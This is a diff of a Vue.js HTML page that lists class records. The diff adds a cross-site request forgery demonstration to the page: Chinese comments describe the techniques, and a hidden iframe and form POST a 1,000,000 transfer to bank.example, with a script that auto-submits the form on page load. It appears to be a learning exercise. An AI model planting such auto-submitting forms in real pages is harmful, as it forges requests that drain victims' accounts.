@@ -1,9 +1,10 @@
 <!doctype html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport"
-          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+        content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <title>Document</title>
     <link rel="icon" href="/static/main/image/favicon.ico">
@@ -13,40 +14,59 @@
     <script src="/static/main/js/vue-resource.js"></script>
     <script src="http://mockjs.com/dist/mock.js"></script>
 </head>
+
 <body>
+    <div id="app">
+        <ul>
+            <li v-for="c in class_info">{{ c.class_num }} -- {{ c.class_name }} -- {{ c.entrance_time }} -- {{ c.college }}</li>
+        </ul>
+        <textarea name="" id="" cols="50" rows="10">{{ class_info }}</textarea>
 
-<div id="app">
-    <ul>
-    <li v-for="c in class_info">{{ c.class_num }} -- {{ c.class_name }} -- {{ c.entrance_time }} -- {{ c.college }}</li>
-    </ul>
-    <textarea name="" id="" cols="50" rows="100">{{ class_info }}</textarea>
-</div>
+        <!-- // 1.譬如在网站内的图片资源中潜入恶意的转账操作 -->
+        <!-- <img src="http://www.bank.example/transfer?toBankId=hello&amount=1000000" width='0' height='0'> -->
 
-<script src="/static/main/js/index.js"></script>
-<script type="text/javascript">
-    Vue.use(VueResource);
-    var app = new Vue({
-        // delimiters: ['{[', ']}'],
-        el: "#app",
-        data: {
-            class_info: []
-        },
-        created: function () {
-            let url = "/api/buyer";
-            this.$http.get(url).then(function (data) {
-                    console.log("=====================================");
-                    this.class_info = data["data"]["data"];
+        <!-- // 2.构建恶意的隐藏表单，并通过脚本提交恶意请求 -->
+        <div>
+            <a href="https://www.baidu.com">百度</a>
+        </div>
+        <iframe style="display: none;" name="csrf-frame"></iframe>
+        <form method='POST' action='http://www.bank.example/transfer' target="csrf-frame" id="csrf-form">
+            <input type='hidden' name='toBankId' value='hello'>
+            <input type='hidden' name='amount' value='1000000'>
+            <!-- <input type='submit' value='submit'> -->
+        </form>
+    </div>
 
-                    console.log(data["data"]["data"]);
-                    console.log(typeof data["data"]["data"]);
-                },
-                function (error) {
-                    console.log("++++++++++++++++++++++++++++++++++++");
-                    console.log(error);
-                }
-            );
-        }
-    })
-</script>
+    <script>
+        document.getElementById("csrf-form").submit();
+        console.log("crsf");
+    </script>
+    <script src="/static/main/js/index.js"></script>
+    <script type="text/javascript">
+        Vue.use(VueResource);
+        var app = new Vue({
+            // delimiters: ['{[', ']}'],
+            el: "#app",
+            data: {
+                class_info: []
+            },
+            created: function () {
+                        let url = "/api/buyer";
+                        this.$http.get(url).then(
+                            function (data) {
+                                console.log("=====================================");
+                                this.class_info = data["data"]["data"];
+                                console.log(data["data"]["data"]);
+                                console.log(typeof data["data"]["data"]);
+                            },
+                            function (error) {
+                                console.log("++++++++++++++++++++++++++++++++++++");
+                                console.log(error);
+                            }
+                        );
+                    }
+        })
+    </script>
 </body>
+
 </html>
